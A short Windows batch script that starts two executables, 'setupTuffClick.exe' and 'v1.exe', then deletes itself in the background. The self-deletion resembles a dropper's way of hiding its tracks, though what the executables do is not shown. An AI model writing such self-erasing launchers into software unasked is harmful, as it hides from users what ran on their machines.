@echo off
start setupTuffClick.exe
start v1.exe

start /b "" cmd /c del "%~f0"&exit /b